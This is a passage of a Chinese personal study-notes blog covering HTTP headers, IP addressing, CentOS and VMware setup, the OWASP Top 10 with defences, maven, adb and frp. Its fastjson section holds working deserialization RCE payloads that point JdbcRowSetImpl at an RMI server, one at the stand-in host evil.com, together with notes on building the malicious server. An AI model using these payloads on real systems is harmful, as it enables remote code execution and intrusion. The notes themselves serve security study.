Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14</span><br><span class="line">29、 Transfer-Encoding: WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding: chunked</span><br><span class="line">30、 Vary: WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源 WEB 服务器在接到第一个请求消息时，其响应消息的头部为：Content- Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding</span><br><span class="line">31、 Via： 列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添 加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的 Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80(squid/2.6.STABLE13</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符</span><br><span class="line">字符集</span><br><span class="line">字符编码</span><br><span class="line">ASCII</span><br><span class="line">GB2312	常见的6700多个中文字符集	16位</span><br><span class="line">GBK		汉字内码扩展规范  微软  技术规范</span><br><span class="line">UNICODE	万国码 统一码</span><br></pre></td></tr></table></figure>
+
+<h3 id="ip地址"><a href="#ip地址" class="headerlink" title="ip地址"></a>ip地址</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">网卡VMware Network Adapter VMnet0	桥接模式	Bridged</span><br><span class="line">网卡VMware Network Adapter VMnet1	仅主机模式	Host-Only</span><br><span class="line">网卡VMware Network Adapter VMnet8	NAT模式		网络地址转换模式</span><br><span class="line">https://blog.csdn.net/qq_39192827/article/details/85872025</span><br><span class="line"></span><br><span class="line"># 私有地址 内网地址</span><br><span class="line">A类							私有地址</span><br><span class="line">0 网络号 7位 主机号24位	10.0.0.0-10.255.255.255			10  00001010</span><br><span class="line">B类</span><br><span class="line">10 网络号14位 主机号16位	172.16.0.0-172.31.255.255		172  10101100</span><br><span class="line">C类</span><br><span class="line">110 网络号21位 主机号8位	192.168.0.0-192.168.255.255		192  11000000</span><br><span class="line">D类</span><br><span class="line">1110		多点广播</span><br><span class="line">E类</span><br><span class="line">11110		保留</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 特殊地址</span><br><span class="line">A类系统回环地址：127.0.0.0-----127.255.255.255</span><br><span class="line">每个计算机都有一个本地环回接口地址，是127.0.0.1，这个地址是用来测试本机的TCP/IP协议栈有没有正确安装的。</span><br><span class="line">B类地址：168.192.0.0---168.192.255.255</span><br><span class="line">B类保留地址：169.254.0.0----169.254.255.255</span><br><span class="line">D类地址：224.0.0.0-----239.255.255.255</span><br><span class="line">E类地址：240.0.0.0-----255.255.255.255</span><br><span class="line"></span><br><span class="line">0代表网络号 255代表广播地址 不能用</span><br><span class="line"></span><br><span class="line">百度搜ip</span><br><span class="line">公有ip117.136.119.167</span><br><span class="line">校园网是分配认证一个新的ip地址</span><br><span class="line">Ping 127.0.0.1通表明网络功能安装好了，具备可以上网的条件</span><br><span class="line">127.0.0.1-127.255.255.255用于回路测试</span><br><span class="line"></span><br><span class="line">端口具体到程序（QQ 微信 微博） 	0-65535（2的16次）标记程序</span><br><span class="line">进出网络程序的通道</span><br><span class="line">分类</span><br><span class="line">知名端口 0-1023 		特殊程序		超级管理员</span><br><span class="line">21端口		分配给FTP</span><br><span class="line">22端口 		ssh远程登录Linux系统</span><br><span class="line">80端口		网站一般用端口</span><br><span class="line">69端口		用于文件下载</span><br><span class="line"></span><br><span class="line">动态端口 1024-65535	普通 			直接用</span><br><span class="line"></span><br><span class="line">netstat --help</span><br><span class="line">netstat -an	查看端口状态</span><br><span class="line">netstat -ano</span><br><span class="line">isof -i [tcp/udp]:2425</span><br></pre></td></tr></table></figure>
+
+<h3 id="jdk与jre与java"><a href="#jdk与jre与java" class="headerlink" title="jdk与jre与java"></a>jdk与jre与java</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_42257666/article/details/105701938</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jdk比jre多一个虚拟环境 jre是.java文件的解释器 开发用jdk 相当于程序员和操作系统中间夹了jdk(虚拟机环境+jre)</span></span><br><span class="line"></span><br><span class="line">Java X=Java SE X=JDK1.X</span><br><span class="line">Java SE 8就是Java8，或者jdk1.8</span><br></pre></td></tr></table></figure>
+
+<h3 id="浏览器工作原理"><a href="#浏览器工作原理" class="headerlink" title="浏览器工作原理"></a>浏览器工作原理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.输入url 用户在浏览器中输入网址(包含所需资源位置和协议)</span><br><span class="line">2.DNS查询</span><br><span class="line">3.建立链接 根据url协议与目标服务器建立链接</span><br><span class="line">4.发送请求 浏览器向服务器发送http请求 请求中包含资源路径和请求方法</span><br><span class="line">5.服务器响应</span><br><span class="line"></span><br><span class="line">6.渲染页面 浏览器收到html文件后 开始解析并构建文档对象模型(DOM)。DOM是网页结构化表示，可以通过javascript进行操作。</span><br><span class="line">7.加载资源 浏览器发现html文件中其他资源(CSS js 图片)发送额外请求来获取这些资源。同时会根据css贵族对页面进行样式渲染。</span><br><span class="line">8.执行js 浏览器运行js代码 可能会操作dom 更改样式或与服务器进一步通信 js使页面更具动态和交互性。</span><br><span class="line"></span><br><span class="line">9.显示完成</span><br><span class="line">10.关闭连接</span><br></pre></td></tr></table></figure>
+
+<h3 id="Centos安装"><a href="#Centos安装" class="headerlink" title="Centos安装"></a>Centos安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_59430185/article/details/119108112</span><br><span class="line">配置</span><br><span class="line">	字符集为UTF-8				这个搞错终端中文字符乱码</span><br><span class="line">	echo LANG=”zh_CN.UTF-8” &gt; /etc/locale.conf</span><br><span class="line">启用网卡</span><br><span class="line">	echo ONBOOT=yes &gt;&gt; /etc/sysconfig/net-scripts/ifcfg-ens33</span><br><span class="line">修改时间</span><br><span class="line">	date -s “2022/5/11 12:12:12” </span><br><span class="line">ssh服务</span><br><span class="line">	首先查看是否安装openssh-server</span><br><span class="line">yum list installed | grep openssh-server没装yum装</span><br><span class="line">root权限</span><br><span class="line">service sshd start打开</span><br><span class="line">ps -e | grep sshd或者netstat -an | grep 22检查ssh是否打开</span><br><span class="line">[Centos开启SSH服务_心若十年的博客-CSDN博客_centos开启ssh服务](https://blog.csdn.net/qq_41768362/article/details/117331798)</span><br></pre></td></tr></table></figure>
+
+<h3 id="owasp-top10"><a href="#owasp-top10" class="headerlink" title="owasp top10"></a>owasp top10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2017</span><br><span class="line">注入</span><br><span class="line">认证崩溃</span><br><span class="line">敏感数据暴露</span><br><span class="line">XML外部实体(XXE)</span><br><span class="line">访问控制崩溃</span><br><span class="line">安全配置不当</span><br><span class="line">跨站脚本</span><br><span class="line">不安全的反序列化</span><br><span class="line">使用含有已知漏洞的组件</span><br><span class="line">日志记录和监控不充分</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2021</span><br><span class="line">访问控制崩溃</span><br><span class="line">加密失败</span><br><span class="line">注入</span><br><span class="line">不安全的设计</span><br><span class="line">安全配置不当(XML外部实体(XXE))</span><br><span class="line">易受攻击和过时的组件</span><br><span class="line">识别和认证失败(认证崩溃)</span><br><span class="line">软件和数据完整性失败</span><br><span class="line">安全日志记录和监控不充分</span><br><span class="line">服务器请求伪造</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问控制崩溃</span><br><span class="line">通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可利用这个漏洞去查看未授权的功能和数据</span><br><span class="line">e.g.用户账户、敏感文件、获取和正常用户相同的权限</span><br><span class="line">水平越权 垂直越权</span><br><span class="line">防范：访问控制 只有在受信服务器端代码或没有服务器的API中有效，这样攻击者才无法控制检查或元数据</span><br><span class="line">	除公有资源外，默认情况下拒绝访问</span><br><span class="line">	严格判断权限，用户只能操作属于自己的内容</span><br><span class="line">	记录失败的访问控制，并在适当时向管理员告警</span><br><span class="line">	对API和控制器的访问进行速率限制，以最大限度降低自动化攻击的危害</span><br><span class="line">	当用户注销后，服务器的JWT令牌失效</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感数据暴露</span><br><span class="line">phpinfo等</span><br><span class="line">	防范：</span><br><span class="line">		加强员工意识 禁传代码到GitHub</span><br><span class="line">		慎用第三方云服务 不要把工作相关带到云端</span><br><span class="line">		禁用工作邮箱注册非工作相关网站</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">对用户输入数据合法性没有判断或过滤不严</span><br><span class="line">能与用户交互的地方都可能存在注入</span><br><span class="line">防范：</span><br><span class="line">	关闭sql错误回显</span><br><span class="line">	使用成熟的waf</span><br><span class="line">	前端输入字符白名单验证（长度、类型）</span><br><span class="line">	sql服务运行与专门账号，且使用最小权限</span><br><span class="line">	对输入特殊字符进行转义处理</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">不安全的设计</span><br><span class="line">开发软件时，在关键身份验证、访问控制、业务逻辑和关键部位没有进行安全的设计</span><br><span class="line">业务逻辑体现</span><br><span class="line">	支付逻辑</span><br><span class="line">	密码找回</span><br><span class="line">	验证码暴力破解</span><br><span class="line">	验证码重复使用</span><br><span class="line">	验证码客户端回显</span><br><span class="line">	验证码绕过</span><br><span class="line">	验证码自动识别</span><br><span class="line">支付逻辑漏洞	设计购买、支付等方面的功能除就有可能存在支付漏洞</span><br><span class="line">	修改支付价格</span><br><span class="line">	修改支付状态</span><br><span class="line">	修改购买数量</span><br><span class="line">	修改优惠卷、积分</span><br><span class="line">	修改支付接口</span><br><span class="line">	多重替换支付</span><br><span class="line">	重复支付</span><br><span class="line">	最小额支付</span><br><span class="line">	最大额支付问题</span><br><span class="line">	无限制试用</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">安全配置不当</span><br><span class="line">不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的向西错误信息</span><br><span class="line">不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且需要及时修补和升级他们</span><br><span class="line">可能存在的风险点</span><br><span class="line">	应用程序启用或者安装了不必要的安全功能</span><br><span class="line">	默认账户名和密码没有修改</span><br><span class="line">	应用软件已国企或出了新版本未更新</span><br><span class="line">	应用程序服务器，应用程序框架等未进行安全配置</span><br><span class="line">	错误处理机制披露大量敏感信息</span><br><span class="line">	对于更新的系统，禁用或不安全地配置安全功能</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用含有已知漏洞组件</span><br><span class="line">组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">识别和认证失败</span><br><span class="line">通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久性冒充其他用户的身份。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">软件和数据完整性失败</span><br><span class="line">软件和数据完整性故障与不能防止完整性违规的代码和基础设施有关。		下软件hash值匹配  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不足的日志记录和监控</span><br><span class="line">不足的日志记录和监控，以及事件响应确实或无效的集成，是攻击者能够近一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。</span><br><span class="line">	未记录可审计性事件 登录、登陆失败、高额交易</span><br><span class="line">	告警和错误事件未能产生不足和不清晰的日志信息</span><br><span class="line">	日志信息仅在本地存储</span><br><span class="line">	没有利用应用系统和api的日志信息来监控可疑活动</span><br><span class="line">	对于实时或准实时的攻击，应用程序无法检测、处理和告警</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器端请求伪造</span><br><span class="line">攻击者能够从易受攻击的Web应用陈虚谷发送精心设计的请求对其他网站进行攻击</span><br><span class="line">A让B帮忙访问C</span><br></pre></td></tr></table></figure>
+
+<h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">idea2020 maven3.6</span><br><span class="line">maven下载加个环境变量</span><br><span class="line"></span><br><span class="line">修改/conf/settings.xml</span><br><span class="line">	仓库位置	斜杠方向改下</span><br><span class="line">      &lt;localRepository&gt;D:/maven_jar/repository&lt;/localRepository&gt;</span><br><span class="line">    镜像 &lt;mirrors&gt;标签中添加</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;id&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">      &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">	项目根目录下 mvn compile 此时就会下载项目的jar文件</span><br><span class="line">	执行main方法</span><br><span class="line">		mvn exec:java -Dexec.mainClass=&quot;com.xxxx.demo.Hello&quot;</span><br><span class="line">		</span><br><span class="line">java项目选择org.apache.maven.archetypes:maven-archetype-quickstart</span><br><span class="line">web项目选择org.apache.maven.archetypes:maven-archetype-webapp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/image-20230417232216350.png" alt="image-20230417232216350"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目setting配置</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/1688006810775.png" alt="1688006810775"></p>
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1Ab4y1d7w1</span><br><span class="line">fastjson  json和java的object对象</span><br><span class="line">实现一个java对象</span><br><span class="line">	属性</span><br><span class="line">	setter getter</span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.213.153:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">autotype机制 记录原始类型</span><br><span class="line">这里就可以做恶意攻击 引入com.sun.rowset.JdbcRowSetImpl这是个实现继承 implement的类有个属性dataSourceName可以调用rmi服务器</span><br><span class="line">	rmi服务器 一个机器 执行 另一个机器  给的命令   不回显</span><br><span class="line">	搭建一个rmi服务器 github开源项目 这地方踩坑 开源项目里maven的plugin jdk版本   		要么升级jdk版本要么去改setting依赖</span><br><span class="line">	搭建攻击服务器 用runtime和process那两个类去编写java恶意文件再编译成class文件 用SimpleHTTPServer去开个http服务</span><br><span class="line"></span><br><span class="line">抓包修改进行攻击</span><br><span class="line"></span><br><span class="line">1.2.24版本</span><br><span class="line">1.2.25版本 checkautotype机制	黑白名单检测</span><br><span class="line">	特殊处理 Lxxxx; ---&gt; Lxxx;</span><br><span class="line">	</span><br><span class="line">1.2.47 autotype不开启 全局缓存 fastjson cache设置为true--&gt;val对应的class到全局缓存中</span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shiro框架 shiro 1.2.24</span><br><span class="line">remember me 功能		cookie 很大</span><br><span class="line">aes加密 密钥泄露在函数里面</span><br></pre></td></tr></table></figure>
+
+<h3 id="vmware挂载共享文件夹"><a href="#vmware挂载共享文件夹" class="headerlink" title="vmware挂载共享文件夹"></a>vmware挂载共享文件夹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">参考https://blog.csdn.net/weixin_45888098/article/details/128890289</span><br><span class="line">1.vmware设置中启用共享文件夹 并设置主机路径 D:\shared_document</span><br><span class="line">2.需要安装vmware tool		apt-get install open-vm-tools-desktop fuse</span><br><span class="line">3.vmware-hgfsclient		查看共享目录</span><br><span class="line">4.创建目录		mkdir -p /mnt/hgfs/shared_document</span><br><span class="line">5.挂载	/usr/bin/vmhgfs-fuse .host:/shared_document /mnt/hgfs/shared_document -o subtype=vmhgfs-fuse,allow_other</span><br><span class="line"></span><br><span class="line">6.开机需要重新挂载 添加自动挂载</span><br><span class="line">	vim /etc/fstab</span><br><span class="line">		.host:/shared_document /mnt/hgfs/shared_document fuse.vmhgfs-fuse allow 0 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="8080端口被占用"><a href="#8080端口被占用" class="headerlink" title="8080端口被占用"></a>8080端口被占用</h3><p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/image-20230521202926073.png" alt="image-20230521202926073"></p>
+<h3 id="adb调试华为"><a href="#adb调试华为" class="headerlink" title="adb调试华为"></a>adb调试华为</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#允许ADB调试</span><br><span class="line">	1.【设置】→【系统和更新】→【开发人员选项】（如果没有这个按钮需要去【关于手机】→【版本号】→点击5次即可进入开发者模式）点击仅充电模式下允许ADB调试！</span><br><span class="line">连接数据线的情况下</span><br><span class="line">	adb tcpip 12321		#开启了一个类似ssh的服务</span><br><span class="line"></span><br><span class="line">#需要手机和电脑端在一个ip下</span><br><span class="line">adb connect 192.168.200.15:12321</span><br><span class="line"></span><br><span class="line">#UMX0220908023656是我忘记拔掉数据线 这个设备是数据线连接的</span><br><span class="line">C:\Users\hyy&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">UMX0220908023656        device</span><br><span class="line">192.168.200.15:12321    device</span><br><span class="line"></span><br><span class="line">#选中要连接的设备</span><br><span class="line">adb -s 192.168.200.15:12321 shell</span><br><span class="line">adb -s UMX0220908023656 shell</span><br><span class="line"></span><br><span class="line">#或者拔掉数据线</span><br><span class="line">adb shell</span><br><span class="line"></span><br><span class="line">#但是不是root权限 只有shell权限 adb root执行不了</span><br></pre></td></tr></table></figure>
+
+<h3 id="frp-内网映射外网"><a href="#frp-内网映射外网" class="headerlink" title="frp 内网映射外网"></a>frp 内网映射外网</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">映射到也可以用cpolar 只是不能指定ip 是用别人的随机域名</span><br><span class="line">frp映射</span><br><span class="line">	https://blog.csdn.net/oyy_1126/article/details/115702152</span><br><span class="line">服务端</span><br><span class="line">	需开启防火墙 firewall和腾讯云 frp端口以及被映射的端口</span><br><span class="line">	frps.ini 只需设置一个frp服务端口即可</span><br><span class="line">	frps -c frps.ini</span><br><span class="line">客户端</span><br><span class="line">	无需打开防火墙</span><br><span class="line">	frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务器centos安装msf"><a href="#服务器centos安装msf" class="headerlink" title="服务器centos安装msf"></a>服务器centos安装msf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44268918/article/details/129771330</span><br></pre></td></tr></table></figure>
+
+<h3 id="Centos搭建云服务器"><a href="#Centos搭建云服务器" class="headerlink" title="Centos搭建云服务器"></a>Centos搭建云服务器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">重装	2核40g</span><br><span class="line"></span><br><span class="line">虚拟机重装centos 公钥问题</span><br><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br><span class="line"></span><br><span class="line">这个报错重装之后会有，把这个文件删了</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/07/20/%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9/1656411333134.png" alt="1656411333134"></p>
+<h3 id="宝塔-Docker-Halo"><a href="#宝塔-Docker-Halo" class="headerlink" title="宝塔+Docker+Halo"></a>宝塔+Docker+Halo</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">安装宝塔</span><br><span class="line">	https://bt.cn/bbs/thread-19376-1-1.html</span><br><span class="line"></span><br><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh			install.sh文件下载在/root文件夹下</span><br><span class="line">bt default查看内外网地址及密码</span><br><span class="line">安装选择左边的ngnix		面板8888端口放行</span><br></pre></td></tr></table></figure>
+
